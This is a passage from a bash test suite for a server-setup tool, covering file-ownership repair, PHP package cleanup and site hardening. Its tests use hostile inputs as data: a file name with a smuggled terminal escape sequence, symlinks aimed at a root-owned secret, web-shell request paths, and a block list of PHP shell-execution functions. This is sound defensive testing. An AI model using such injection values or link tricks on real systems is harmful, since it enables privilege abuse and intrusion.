  assert_has   "saying why" "never hands over a device node or a file with more than one name, and the site has 2 of them" "$(cat "$_fo_out")"
  assert_has   "and naming it" "public_html/index-copy.php" "$(cat "$_fo_out")"
  assert_eq    "before chown ever runs" "" "$(cat "$_fo_calls")"
  # and should one be moved into place after that look, the change itself passes it over
  : >"$_fo_calls"
  _domain_fix_owner_apply "$_fo_h" "$(( _fo_u + 1 ))" "$_fo_g" 2>/dev/null || true
  assert_has   "the change hands over the rest" "${_fo_hp}/public_html/wp-content" "$(cat "$_fo_calls")"
  assert_lacks "but not a file with a second name" "index-copy.php" "$(cat "$_fo_calls")"
  assert_lacks "nor its other name" "${_fo_hp}/public_html/index.php" "$(cat "$_fo_calls")"
  rm -f "$_fo_h/public_html/index-copy.php"
  if (( CAN_SYMLINK )); then
    rm -f "$_fo_h/logs"; mkdir -p "$_fo_h/logs"; printf 's' >"$_fo_h/logs/stash"; ln "$_fo_h/logs/stash" "$_fo_h/logs/stash2"
    : >"$_fo_calls"
    assert_eq  "a second name hidden in logs/ stops it too" 1 "$(_fo own.example.com)"
    assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
    rm -rf "$_fo_h/logs"; ln -s "$_fo_ld" "$_fo_h/logs"
  fi
  # the runner's own file with a second name belongs to the site already: nothing to look at
  _fo_ids="$_fo_mine"
  ln "$_fo_h/public_html/index.php" "$_fo_h/public_html/index-copy.php"
  assert_eq    "a second name on a file that is the site's already is no reason to stop" 0 "$(_fo own.example.com)"
  rm -f "$_fo_h/public_html/index-copy.php"
  _fo_ids="$_fo_other"
fi
if (( EUID == 0 )) && [[ "${OSTYPE:-}" != msys* && "${OSTYPE:-}" != cygwin* ]]; then
  mknod "$_fo_h/public_html/disk" b 7 0
  : >"$_fo_calls"
  assert_eq  "a device node stops the site" 1 "$(_fo own.example.com)"
  assert_has "and is named" "public_html/disk" "$(cat "$_fo_out")"
  assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
  rm -f "$_fo_h/public_html/disk"
fi

# something mounted inside the home: chown cannot tell its top from a directory
printf '36 25 8:1 / %s rw,relatime shared:1 - ext4 /dev/sdb1 rw\n' "$_fo_h/public_html/shared" >"$DOM_MOUNTINFO"
: >"$_fo_calls"
assert_eq  "a mount inside the home stops the site" 1 "$(_fo own.example.com)"
assert_has "naming it" "mounted inside the home, at ${_fo_h}/public_html/shared" "$(cat "$_fo_out")"
assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
printf '36 25 8:1 / %s rw - ext4 /dev/sdb1 rw\n36 25 8:1 / %s.old/x rw - ext4 /dev/sdb2 rw\n' "$_fo_h" "$_fo_h" >"$DOM_MOUNTINFO"
_fo_ids="$_fo_mine"
assert_eq  "the home as a mount of its own, or a neighbour's, is no reason" 0 "$(_fo own.example.com)"
: >"$DOM_MOUNTINFO"

# names come out of the site user's hands: no terminal control sequence reaches the screen
_fo_ids="$_fo_other"
if (( CAN_HARDLINK && CAN_SYMLINK )); then
  _fo_bad="$_fo_h/public_html/bad"$'\033'"]0;owned"$'\007'"name"
  mkdir -p "$_fo_bad"; ln "$_fo_h/site.zip" "$_fo_bad/görsel.zip"
  _fo own.example.com >/dev/null
  assert_lacks "an escape character in a name is not printed" $'\033' "$(cat "$_fo_out")"
  assert_has   "it is shown as a question mark, and a Turkish letter as itself" "bad?]0;owned?name/görsel.zip" "$(cat "$_fo_out")"
  rm -rf "$_fo_bad"
fi
# ... and none reaches the log through what chown says about it either
if (( CAN_SYMLINK )); then
  _fo_esc="$_fo_h/public_html/esc"$'\033'"[31mred"
  mkdir -p "$_fo_esc"
  _fo_ls="$(wc -c <"$LOG_FILE")"
  _fo own.example.com >/dev/null
  _fo_newlog="$(tail -c +"$(( _fo_ls + 1 ))" "$LOG_FILE")"
  assert_has   "what chown says goes to the log" "fake-chown -h -- own_example_com:own_example_com" "$_fo_newlog"
  assert_lacks "without a control character a name brought along" $'\033' "$_fo_newlog"
  rmdir "$_fo_esc"
fi

# --all: every registered site, on past one that fails, and an exit status that tells
lib_domain_state_reset
D_DOMAIN="own2.example.com"; D_IDENT="own2_example_com"; D_USER="own2_example_com"; D_GROUP="own2_example_com"
D_HOME="$SITES_ROOT/own2.example.com"; D_MODE="static"
lib_domain_state_save   # no home on disk
_fo_ids="$_fo_mine"
assert_eq  "--all with one site failing exits 1" 1 "$(_fo --all)"
assert_has "the others are still done" "own.example.com: everything already belongs to own_example_com" "$(cat "$_fo_out")"
assert_has "the failing one is named"  "own2.example.com: ${SITES_ROOT}/own2.example.com is not a directory; nothing changed" "$(cat "$_fo_out")"
assert_has "and counted"               "1 of 2 site(s) could not be handed over completely" "$(cat "$_fo_out")"
rm -rf "${STATE_DIR}/domains/own2.example.com"
assert_eq  "--all over sites that are all fine exits 0" 0 "$(_fo --all)"
STATE_DIR="$TMP/fo-none"
assert_eq  "--all without a site exits 0" 0 "$(_fo --all)"
assert_has "and says there is none" "No sites have been added yet." "$(cat "$_fo_out")"
STATE_DIR="$TMP/fo-state"

# the account behind the numbers: it has to be this site's, and never root
eval "$_fo_orig_ids"
if command -v getent >/dev/null 2>&1 && getent passwd root >/dev/null 2>&1; then
  D_USER="nosuch_fo_account"; D_GROUP="nosuch_fo_account"
  assert_has "an account that is gone is named" "its user nosuch_fo_account does not exist" "$(_domain_fix_owner_ids /home/x || true)"
  D_USER="root"; D_GROUP="root"
  assert_has "root is never a site's account" "is not a site account" "$(_domain_fix_owner_ids "$(getent passwd root | cut -d: -f6)" || true)"
  if (( EUID != 0 )); then
    D_USER="$(id -un)"; D_GROUP="$(id -gn)"
    assert_has "an account with another home is refused" "the home of ${D_USER} is" "$(_domain_fix_owner_ids /home/elsewhere.example.com || true)"
    assert_eq  "the account of this home gives its numbers" "$(id -u) $(id -g)" \
      "$(_domain_fix_owner_ids "$(getent passwd "$D_USER" | cut -d: -f6)" || true)"
  fi
fi

# as root, for real: the files change hands, links are changed and never followed, and what
# they lead to - a file root keeps outside the site - stays root's
if (( EUID == 0 )) && [[ "${OSTYPE:-}" != msys* && "${OSTYPE:-}" != cygwin* ]] && id -u nobody >/dev/null 2>&1; then
  eval '_domain_fix_owner_ids() { printf "%s" "$_fo_ids"; }'
  DOM_FIX_OWNER_PATH="/usr/sbin:/usr/bin:/sbin:/bin"
  lib_domain_state_reset
  D_DOMAIN="real.example.com"; D_IDENT="real_example_com"; D_USER="nobody"; D_GROUP="$(id -gn nobody)"
  D_HOME="$SITES_ROOT/real.example.com"; D_MODE="php"
  lib_domain_state_save
  _fo_r="$SITES_ROOT/real.example.com"; _fo_v="$TMP/fo-victim"
  mkdir -p "$_fo_r/public_html/deep/er" "$_fo_r/logs" "$_fo_v/dir"
  printf 'secret' >"$_fo_v/secret"; printf 'inner' >"$_fo_v/dir/inner"; printf 'x' >"$_fo_r/public_html/deep/er/page.html"
  printf 'log' >"$_fo_r/logs/error.log"
  ln -s "$_fo_v/secret" "$_fo_r/secret-link"
  ln -s "$_fo_v/dir" "$_fo_r/public_html/deep/dir-link"
  ln -s "$_fo_v/secret" "$_fo_r/public_html/deep/er/file-link"
  _fo_ids="$(id -u nobody) $(id -g nobody)"
  assert_eq  "a real run exits 0" 0 "$(_fo real.example.com)"
  assert_has "and reports what it handed over" "files and directories handed to nobody:" "$(cat "$_fo_out")"
  printf 'r' >"$_fo_r/public_html/one-more.txt"
  assert_eq  "one more upload" 0 "$(_fo real.example.com)"
  assert_has "is one file, in the singular" "real.example.com: 1 file or directory handed to nobody:" "$(cat "$_fo_out")"
  assert_eq  "nothing in the home but logs/ is root's any more" "" \
    "$(find "$_fo_r" -path "$_fo_r/logs" -prune -o -uid 0 -print)"
  assert_eq  "the links themselves changed hands" "$(id -u nobody)" "$(stat -c %u "$_fo_r/public_html/deep/dir-link")"
  assert_eq  "logs/ stays root's"                "0 0" "$(stat -c '%u %g' "$_fo_r/logs")"
  assert_eq  "and so does what is in it"         "0" "$(stat -c %u "$_fo_r/logs/error.log")"
  assert_eq  "a file a link led to stays root's" "0 0" "$(stat -c '%u %g' "$_fo_v/secret")"
  assert_eq  "a directory a link led to too"     "0 0 0" "$(stat -c '%u %g' "$_fo_v/dir") $(stat -c %u "$_fo_v/dir/inner")"
  assert_eq  "a second run has nothing to do" 0 "$(_fo real.example.com)"
  assert_has "and says so" "real.example.com: everything already belongs to nobody" "$(cat "$_fo_out")"
  rm -rf "$_fo_r" "$_fo_v" "${STATE_DIR}/domains/real.example.com"
fi

# the menu: item 21, every site unless one is picked
_mfo() {   # [answer] -> the command the menu runs
  (
    eval '_menu_ask() { local -n _o="$1"; _o="${_mfa:-${3:-}}"; }
          _menu_run() { printf "%s\n" "$*"; }
          _menu_pick_domain() { printf "picked.example.com"; }
          _menu_pause() { :; }'
    _mfa="${1:-}"
    _menu_fix_owner 2>/dev/null | tail -n 1
  )
}
assert_eq  "the menu hands over every site by default" "fix-owner --all" "$(_mfo)"
assert_eq  "or the one picked"                         "fix-owner picked.example.com" "$(_mfo 2)"
_menu_block="$(awk '/_menu_group "SITES"/{f=1} f{print} f && /^[[:space:]]*esac/{exit}' "$ROOT/lib/menu.sh")"
assert_has "it is item 21 of the main menu"   '_menu_item 21 "Fix file ownership (after uploading as root)"' "$_menu_block"
assert_has "which opens it"                   '21) _menu_fix_owner ;;' "$_menu_block"
assert_has "the command is dispatched"        'fix-owner)      lib_domain_fix_owner_main "${rest[@]}" || exit 1 ;;' "$(cat "$ROOT/setup.sh")"
assert_has "and in the command reference"     "fix-owner <domain>|--all" "$(lib_usage)"
assert_has "a new site's summary points at it" 'setup.sh fix-owner ${D_DOMAIN}' "$(declare -f lib_domain_summary)"
if [[ -e /proc/sys/fs/protected_hardlinks ]]; then
  assert_has "lomp's sysctl file keeps hard links protected" "fs.protected_hardlinks = 1" "$(lib_system_render_sysctl)"
  assert_has "and links in sticky directories"              "fs.protected_symlinks = 1" "$(lib_system_render_sysctl)"
fi

eval "$_fo_saved"; eval "$_fo_orig_ids"; eval "$_fo_orig_rt"
rm -rf "$_fo_h" "$_fo_ld"
lib_domain_state_reset

# =============================================================================
section "php-cleanup: what 'apt-get install lsphp83*' added goes, and nothing else"
# The wildcard brings a compiler, debug symbols, the module sources and the distribution's own
# PHP. apt's history names what that one run installed; only that is ever a candidate.
_pc="$TMP/phpclean"; mkdir -p "$_pc"
_pc_saved="$(declare -f lib_pkg_installed lib_php_cli lib_run lib_php_restart_workers lib_php_ensure_extensions lib_php_installed_versions lib_php_installed lib_require_tools lib_require_installed)"
_pc_hist="$PHP_APT_HISTORY"; PHP_APT_HISTORY="$_pc/history.log"
cat >"$PHP_APT_HISTORY" <<'EOF'

Start-Date: 2026-09-20  10:00:00
Commandline: apt-get install -y -q --no-install-recommends lsphp83 lsphp83-common
Install: lsphp83:amd64 (8.3.33-1+noble), lsphp83-common:amd64 (8.3.33-1+noble)
End-Date: 2026-09-20  10:00:09

Start-Date: 2026-09-27  21:14:02
Commandline: apt-get install lsphp83*
Requested-By: someone (1000)
Install: lsphp83-dev:amd64 (8.3.33-1+noble), gcc:amd64 (4:13.2.0-7ubuntu1, automatic), lsphp83-sqlite3:amd64 (8.3.33-1+noble), lsphp83-ioncube:amd64 (14.0-1), php8.3-cli:amd64 (8.3.6-0ubuntu0.24.04.5, automatic), libtool:amd64 (2.4.7-7build1, automatic), gdb:amd64 (15.0, automatic), lsphp83-igbinary:amd64 (3.2-1)
End-Date: 2026-09-27  21:15:40

Start-Date: 2026-09-28  09:00:00
Commandline: apt-get install htop lsphp83-ldap
Install: htop:amd64 (3.3.0-4build1), lsphp83-ldap:amd64 (8.3.33-1+noble)
End-Date: 2026-09-28  09:00:03
EOF
printf '\nStart-Date: 2026-08-01  08:00:00\nCommandline: apt install lsphp83* -y\nInstall: lsphp83-dbg:amd64 (8.3.30-1+noble)\nEnd-Date: 2026-08-01  08:01:00\n' | gzip -c >"$PHP_APT_HISTORY.2.gz"
assert_eq "the wildcard runs' packages are read from the history, rotated copies too" \
  "gcc gdb libtool lsphp83-dbg lsphp83-dev lsphp83-igbinary lsphp83-ioncube lsphp83-sqlite3 php8.3-cli" \
  "$(_php_wildcard_added lsphp83 | paste -sd' ' -)"
assert_eq "another version's wildcard is not this one's" "" "$(_php_wildcard_added lsphp84)"
# gdb was removed since; everything else is installed
: >"$_pc/calls"; : >"$_pc/needs"; : >"$_pc/autogone"
printf '%s\n' gcc libtool php8.3-cli >"$_pc/auto"
eval 'lib_pkg_installed() { [[ "$1" != "gdb" ]]; }
      apt-mark() { cat "$_pc/auto"; }
      apt-get() {   # -s purge: the arguments and what "needs" says they drag along; the autoremove
        local a="" sim=0 mode="" out=()   # simulation: "autogone"; --assume-no: the size line
        for a in "$@"; do
          case "$a" in
            -s) sim=1 ;; purge|autoremove) [[ -n "$mode" ]] || mode="$a" ;;
            --assume-no) printf "After this operation, 484 MB disk space will be freed.\n"; return 1 ;;
            -*|APT::*) ;;
            *) out+=("$a") ;;
          esac
        done
        (( sim )) || return 0
        if [[ " $* " == *" --autoremove "* || "$mode" == "autoremove" ]]; then sed "s/^/Purg /; s/\$/ [1]/" "$_pc/autogone"; return 0; fi
        for a in "${out[@]}"; do printf "Purg %s [1]\n" "$a"; awk -F: -v p="$a" "\$1 == p { print \"Purg \" \$2 \" [1]\" }" "$_pc/needs"; done
      }
      lib_php_cli() { printf "%s/php" "$_pc"; }
      lib_run() { printf "%s\n" "$*" >>"$_pc/calls"; }
      lib_php_restart_workers() { printf "restart\n" >>"$_pc/calls"; }
      lib_php_ensure_extensions() { :; }
      lib_php_installed_versions() { printf "8.3\n"; }
      lib_php_installed() { return 0; }
      lib_require_tools() { :; }; lib_require_installed() { :; }'
printf '#!/usr/bin/env bash\nprintf ok\n' >"$_pc/php"; chmod +x "$_pc/php"
assert_eq "what lomp installs itself is no candidate, nor what is gone already" \
  "gcc libtool lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "$(lib_php_cleanup_candidates 8.3 | paste -sd' ' -)"
assert_has "doctor counts what php-cleanup would purge, not what it keeps" 'extra="${#PHP_CLEAN_REMOVE[@]}"' "$(declare -f _doc_check_domains)"
lib_php_cleanup_plan 8.3
assert_eq "all of it goes when nothing else comes along" \
  "gcc libtool lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "${PHP_CLEAN_REMOVE[*]}"
assert_eq "the extension packages among them are named" "lsphp83-dbg lsphp83-dev lsphp83-ioncube" "${PHP_CLEAN_EXTS[*]}"
assert_eq "nothing is held" "" "${PHP_CLEAN_HELD[*]-}${PHP_CLEAN_MANUAL[*]-}${PHP_CLEAN_EXTRA}"
# gcc marked as manually installed since: it stays
printf '%s\n' libtool php8.3-cli >"$_pc/auto"
lib_php_cleanup_plan 8.3
assert_eq    "a package marked manual since is kept" "gcc" "${PHP_CLEAN_MANUAL[*]}"
assert_lacks "and not purged"                        " gcc " " ${PHP_CLEAN_REMOVE[*]} "
printf '%s\n' gcc libtool php8.3-cli >"$_pc/auto"
# something installed since needs libtool: apt says what nothing needs, and libtool stays
printf 'libtool:autoconf-archive\n' >"$_pc/needs"
printf '%s\n' gcc lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli >"$_pc/autogone"
lib_php_cleanup_plan 8.3
assert_eq "what something that stays needs is held"  "libtool" "${PHP_CLEAN_HELD[*]}"
assert_eq "and what it is that needs it is named"     "autoconf-archive" "$PHP_CLEAN_BLOCKERS"
assert_eq "the rest still goes" "gcc lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "${PHP_CLEAN_REMOVE[*]}"
assert_eq "with nothing dragged along"               "" "$PHP_CLEAN_EXTRA"
# a list that would still take a foreign package with it: stop, change nothing
printf 'libtool:autoconf-archive\ngcc:build-essential\n' >"$_pc/needs"
_out="$(OPT_QUIET=0; OPT_YES=1; rc=0; lib_php_cleanup_main >"$_pc/out" 2>&1 || rc=$?; cat "$_pc/out"; printf 'rc=%s' "$rc")"
assert_has "a purge that would take a foreign package along stops" "apt would also remove packages that 'lsphp83*' did not install: build-essential" "$_out"
assert_has "with a failing status" "rc=1" "$_out"
assert_eq  "and nothing purged"    "" "$(cat "$_pc/calls")"
: >"$_pc/needs"; : >"$_pc/autogone"
# a dry run and a "no" change nothing
_out="$(OPT_QUIET=0; OPT_DRY_RUN=1; lib_php_cleanup_main 2>&1)"
assert_has "a dry run lists the packages" "lsphp83-dev" "$_out"
assert_has "the space they take"          "484 MB disk space will be freed" "$_out"
assert_has "warns about the extensions"   "which every site stops loading: lsphp83-dbg lsphp83-dev lsphp83-ioncube" "$_out"
assert_eq  "and purges nothing"           "" "$(cat "$_pc/calls")"
_out="$(OPT_QUIET=0; OPT_YES=0; OPT_NON_INTERACTIVE=1; lib_php_cleanup_main 2>&1 </dev/null)"
assert_has "unanswered, the default is no" "Nothing changed." "$_out"
assert_eq  "and nothing is purged"         "" "$(cat "$_pc/calls")"
_out="$(OPT_QUIET=0; OPT_YES=1; lib_php_cleanup_main 2>&1)"
assert_has "with --yes the list is purged, exactly" \
  "apt-get purge -y -q gcc libtool lsphp83-dbg lsphp83-dev lsphp83-ioncube php8.3-cli" "$(head -n 1 "$_pc/calls")"
assert_has "PHP is started once to see that it still does" "PHP starts cleanly" "$_out"
assert_has "the workers are restarted to drop the old set" "restart" "$(cat "$_pc/calls")"
: >"$_pc/calls"
eval 'lib_pkg_installed() { case "$1" in gdb|gcc|libtool|lsphp83-dbg|lsphp83-dev|lsphp83-ioncube|php8.3-cli) return 1 ;; esac; return 0; }'
_out="$(OPT_QUIET=0; OPT_YES=1; lib_php_cleanup_main 2>&1)"
assert_has "a second run finds nothing to remove" "nothing to remove" "$_out"
assert_eq  "and runs nothing"                     "" "$(cat "$_pc/calls")"
rm -f "$PHP_APT_HISTORY" "$PHP_APT_HISTORY.2.gz"
_out="$(OPT_QUIET=0; OPT_YES=1; lib_php_cleanup_main 2>&1)"
assert_has "a server that never ran the wildcard has nothing to undo" "nothing to undo" "$_out"
assert_has "setup.sh has the command" 'php-cleanup)    lib_php_cleanup_main' "$(cat "$ROOT/setup.sh")"
assert_has "the menu offers it"       '22) _menu_run php-cleanup' "$(cat "$ROOT/lib/menu.sh")"
PHP_APT_HISTORY="$_pc_hist"; eval "$_pc_saved"; unset -f apt-get apt-mark

# =============================================================================
section "harden: what a PHP shell in one site can do"
# A shell dropped into a site runs as that site's PHP. It should start no process, read nothing
# outside the site, not run from an upload directory, and reach no local port it has no use for.
_hd_fns="lib_domains_list lib_mail_installed _sitefw_uid lib_sitefw_loaded lib_ols_is_installed lib_ols_change_begin lib_ols_change_commit lib_harden_php_restart _harden_code lib_require_tools lib_require_installed lib_system_profile lib_domain_registered"
_hd_saved="$(for _f in $_hd_fns; do declare -f "$_f" || true; done)"
_hd_state="$STATE_DIR"; STATE_DIR="$TMP/hd-state"; mkdir -p "$STATE_DIR"; printf '{}\n' >"$STATE_DIR/manifest.json"
_hd_ini="$HARDEN_PHP_INI_ROOT"; HARDEN_PHP_INI_ROOT="$TMP/hd-ini"
_hd_fw="$SITEFW_DIR"; SITEFW_DIR="$TMP/hd-fw"; _hd_sc="$SITEFW_SCRIPT"; SITEFW_SCRIPT="$TMP/hd-fw-script"; _hd_un="$SITEFW_UNIT"; SITEFW_UNIT="$TMP/hd-fw.service"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_hd_site() {   # domain mode [proxy-target]
  local d="$1" i="${1//./_}"
  mkdir -p "$STATE_DIR/domains/$d"
  jq -n --arg d "$d" --arg i "$i" --arg h "$SITES_ROOT/$d" --arg m "$2" --arg p "${3:-}" \
    '{domain:$d, ident:$i, user:$i, group:$i, home:$h, mode:$m, proxy:{target:$p},
      php:{version:"8.3", children:4, memory_limit:"256M", upload_max:"64M"}}' >"$STATE_DIR/domains/$d/domain.json"
}
_hd_site hd1.example.com php; _hd_site hd2.example.com wordpress; _hd_site hd3.example.com proxy "127.0.0.1:3000"
jq '.proxies = [{path:"/api/", target:"http://127.0.0.1:8081"}, {path:"/far/", target:"http://10.0.0.5:9000"}]' \
  "$STATE_DIR/domains/hd1.example.com/domain.json" >"$TMP/hd.json" && cat "$TMP/hd.json" >"$STATE_DIR/domains/hd1.example.com/domain.json"

# a site an older release made has no decision recorded, and renders as it always did
lib_domain_state_load hd1.example.com
assert_eq "an older site has no decision recorded" "" "${D_SEC_EXEC}${D_SEC_UPLOAD}"
_vh="$(lib_ols_render_vhconf)"
assert_lacks "its PHP is pointed at no ini directory" "PHP_INI_SCAN_DIR" "$_vh"
assert_lacks "and its upload directories run scripts as before" "(uploads?|files|media|cache|te?mp)" "$_vh"
# a new site starts hardened
( lib_domain_parse_add_args new.example.com >/dev/null 2>&1; printf '%s %s' "$D_SEC_EXEC" "$D_SEC_UPLOAD" ) >"$TMP/hd-new" 2>/dev/null || true
assert_eq "a new site starts with both blocked" "blocked blocked" "$(cat "$TMP/hd-new")"

D_SEC_EXEC="blocked"; D_SEC_UPLOAD="blocked"
_vh="$(lib_ols_render_vhconf)"; printf '%s\n' "$_vh" >"$TMP/hd.vhconf"
assert_true "the hardened vhost is balanced" _ols_braces_balanced "$TMP/hd.vhconf"
assert_has "its PHP reads the site's ini directory after the version's own" \
  "  env                     PHP_INI_SCAN_DIR=:${HARDEN_PHP_INI_ROOT}/hd1.example.com" "$_vh"
assert_has "inside the site's own processor" "PHP_INI_SCAN_DIR" "$(awk '/^extprocessor hd1_example_com \{/,/^\}/' "$TMP/hd.vhconf")"
assert_lacks "disable_functions is not left to phpIniOverride, which cannot set it" "php_admin_value disable_functions" "$_vh"
_rule="$(grep -F '(uploads?|files|media|cache|te?mp)' "$TMP/hd.vhconf" || true)"
assert_has "scripts in upload directories are refused" '\.(php[0-9]?|phtml|phar)(/|$) - [F,L]' "$_rule"
# the rule as PCRE would read it, against the requests that matter
_hd_re='^/?(.*/)?(uploads?|files|media|cache|te?mp)/.*\.(php[0-9]?|phtml|phar)(/|$)'
_hd_m() { grep -qiP -- "$_hd_re" <<<"$1"; }
if grep -qP 'a' <<<a 2>/dev/null; then
  for _u in /uploads/shell.php /upload/a/b.PHP /app/files/x.phtml /media/2026/x.php7 /cache/x.phar /tmp/x.php /temp/x.php /uploads/x.php/extra/path; do
    assert_true "refused: ${_u}" _hd_m "$_u"
  done
  for _u in /index.php /uploads/photo.jpg /uploads/readme.php.txt /admin/upload.php /filesystem/x.php /mediator.php /uploads.php; do
    assert_false "served: ${_u}" _hd_m "$_u"
  done
fi
D_MODE="wordpress"
assert_lacks "WordPress keeps its own rule, for wp-content/uploads alone" "(uploads?|files|media|cache|te?mp)" "$(lib_ols_render_vhconf)"
D_MODE="php"
_ini="$(lib_harden_render_php_ini)"
for _f in exec passthru shell_exec system proc_open popen pcntl_exec putenv dl; do
  assert_has "disabled: ${_f}" ",${_f}," ",$(sed -n 's/^disable_functions = //p' <<<"$_ini"),"
done
assert_lacks "mail() stays: sites send mail" ",mail," ",$(sed -n 's/^disable_functions = //p' <<<"$_ini"),"
assert_has "PHP reads the site's home, its logs, PHP's own share and /tmp - nothing else" \
  "open_basedir = ${D_HOME}/:${SITES_LOG_ROOT}/hd1.example.com/:${LSWS_HOME}/lsphp83/share/:/tmp/" "$_ini"

# the ini directory follows the state: written when blocked, removed when allowed
HARDEN_PHP_CHANGED=""
lib_harden_php_ini_write
_hf="$HARDEN_PHP_INI_ROOT/hd1.example.com/$HARDEN_PHP_INI_NAME"
assert_true "blocked: the ini is written" test -s "$_hf"
assert_eq   "and the site is named as changed" "hd1.example.com" "$HARDEN_PHP_CHANGED"
if (( CAN_CHMOD )); then
  assert_eq "the site's group may read it, nobody may change it" "640 750" "$(stat -c %a "$_hf") $(stat -c %a "$(dirname "$_hf")")"
fi
HARDEN_PHP_CHANGED=""; lib_harden_php_ini_write
assert_eq   "a second write changes nothing" "" "$HARDEN_PHP_CHANGED"
assert_has  "writing a vhost puts its ini directory in place" 'lib_harden_php_ini_write' "$(declare -f lib_ols_vhconf_write)"
D_SEC_EXEC="allowed"; HARDEN_PHP_CHANGED=""; lib_harden_php_ini_write
assert_false "allowed: the directory goes" test -e "$(dirname "$_hf")"
assert_eq    "which is a change too" "hd1.example.com" "$HARDEN_PHP_CHANGED"
assert_lacks "and the vhost points PHP at nothing" "PHP_INI_SCAN_DIR" "$(lib_ols_render_vhconf)"
D_SEC_EXEC="blocked"; D_MODE="proxy"; lib_harden_php_ini_write
assert_false "a site with no PHP gets no ini" test -e "$(dirname "$_hf")"
OPT_DRY_RUN=1; D_MODE="php"; lib_harden_php_ini_write >/dev/null 2>&1; OPT_DRY_RUN=0
assert_false "a dry run writes none" test -e "$_hf"
assert_has "remove takes the ini directory with the files" '"$(lib_harden_php_ini_dir "$domain")"' "$(declare -f lib_domain_remove_main)"

# the decision survives a save and a load, and an older site's absence of one does too
lib_domain_state_load hd1.example.com; D_SEC_EXEC="allowed"; D_SEC_UPLOAD="blocked"; lib_domain_state_save
lib_domain_state_load hd1.example.com
assert_eq "the decision is kept in the site's state" "allowed blocked" "$D_SEC_EXEC $D_SEC_UPLOAD"
assert_eq "with the path proxies another module wrote" 2 "$(jq '.proxies | length' "$STATE_DIR/domains/hd1.example.com/domain.json")"
lib_domain_state_load hd2.example.com; lib_domain_state_save; lib_domain_state_load hd2.example.com
assert_eq "saving an undecided site decides nothing" "" "${D_SEC_EXEC}${D_SEC_UPLOAD}"
assert_eq "and writes no key" "null" "$(jq -c '.security' "$STATE_DIR/domains/hd2.example.com/domain.json")"

# ---- the site firewall
assert_eq "a local target gives its port"    "3000" "$(_sitefw_local_port 127.0.0.1:3000)"
assert_eq "with a scheme and a path too"     "8081" "$(_sitefw_local_port http://127.0.0.1:8081/x)"
assert_eq "localhost and ::1 are local"      "90 91" "$(_sitefw_local_port localhost:90 | tr '\n' ' '; _sitefw_local_port 'http://[::1]:91')"
assert_eq "another machine's port is not this site's" "" "$(_sitefw_local_port http://10.0.0.5:9000)"
eval '_sitefw_uid() { case "$1" in hd1_example_com) echo 2001 ;; hd2_example_com) echo 2002 ;; hd3_example_com) echo 2003 ;; root0) echo 0 ;; esac; }
      lib_mail_installed() { return 1; }'
assert_eq "each site: its uid and its own local ports" "2001 8081|2002 |2003 3000" "$(lib_sitefw_sites | paste -sd'|' -)"
_r4="$(lib_sitefw_render 4)"; _r6="$(lib_sitefw_render 6)"
assert_eq  "the chains are named, which empties them when the file loads" ":LOMP-SITES - [0:0]|:LOMP-SITES-LOCAL - [0:0]" "$(grep '^:' <<<"$_r4" | paste -sd'|' -)"
assert_eq  "answers pass first: an application still answers the web server" \
  "-A LOMP-SITES -m conntrack --ctstate ESTABLISHED,RELATED -j RETURN" "$(grep '^-A' <<<"$_r4" | head -n 1)"
assert_has "a site reaches its own application" "-A LOMP-SITES -m owner --uid-owner 2003 -p tcp -m multiport --dports 3000 -j RETURN" "$_r4"
assert_has "and its own path proxy"             "-A LOMP-SITES -m owner --uid-owner 2001 -p tcp -m multiport --dports 8081 -j RETURN" "$_r4"
assert_lacks "but not another site's"           "--uid-owner 2001 -p tcp -m multiport --dports 3000" "$_r4"
assert_eq  "every site's user is sent to the local rules" 3 "$(grep -c -- '-m owner --uid-owner [0-9]* -j LOMP-SITES-LOCAL' <<<"$_r4")"
assert_has "which allow DNS, the web server, MariaDB and Redis" "-A LOMP-SITES-LOCAL -p tcp -m multiport --dports 53,80,443,3306,6379 -j RETURN" "$_r4"
assert_lacks "not the WebAdmin panel" "7080" "$_r4"
assert_lacks "nor SSH"                ",22," ",$(sed -n 's/.*LOCAL -p tcp -m multiport --dports \([0-9,]*\).*/\1/p' <<<"$_r4"),"
assert_eq  "and refuse the rest, at once" "-A LOMP-SITES-LOCAL -p tcp -j REJECT --reject-with tcp-reset|-A LOMP-SITES-LOCAL -j REJECT|COMMIT" "$(tail -n 3 <<<"$_r4" | paste -sd'|' -)"
assert_has "IPv4 lets ICMP through" "-p icmp -j RETURN" "$_r4"
assert_has "IPv6 its own"           "-p ipv6-icmp -j RETURN" "$_r6"
eval 'lib_mail_installed() { return 0; }'
assert_has "a server with mail lets sites submit it" "--dports 53,80,443,3306,6379,25,465,587 -j RETURN" "$(lib_sitefw_render 4)"
eval 'lib_mail_installed() { return 1; }'
_sc="$(lib_sitefw_render_script)"
assert_has "the loader replaces only its own chains" 'restore" --noflush <"$d/rules.v$v"' "$_sc"
assert_has "hooks them to connections to this machine" '-I OUTPUT 1 -o lo -j "$c"' "$_sc"
assert_true "and is a valid script" sh -n <<<"$_sc"
assert_has "loaded at boot, after UFW" "After=ufw.service" "$(lib_sitefw_render_unit)"
# off until switched on: nothing is written and nothing loaded
lib_sitefw_regen
assert_false "while it is off, regen writes nothing" test -e "$SITEFW_DIR"
lib_manifest_set_json '.params.site_firewall' 'true'
printf '#!/bin/sh\necho "$@" >>"%s"\n' "$TMP/hd-fw-calls" >"$SITEFW_SCRIPT"; chmod +x "$SITEFW_SCRIPT"; : >"$TMP/hd-fw-calls"
eval 'lib_sitefw_loaded() { return 0; }'
lib_sitefw_regen
assert_true "switched on, the rules are written" test -s "$SITEFW_DIR/rules.v4" -a -s "$SITEFW_DIR/rules.v6"
assert_eq   "and loaded" "start" "$(cat "$TMP/hd-fw-calls")"
: >"$TMP/hd-fw-calls"; lib_sitefw_regen
assert_eq   "unchanged rules are not loaded again" "" "$(cat "$TMP/hd-fw-calls")"
eval 'lib_sitefw_loaded() { return 1; }'
lib_sitefw_regen >/dev/null 2>&1
assert_eq   "unless the kernel lost them" "start" "$(cat "$TMP/hd-fw-calls")"
eval 'lib_sitefw_loaded() { return 0; }'
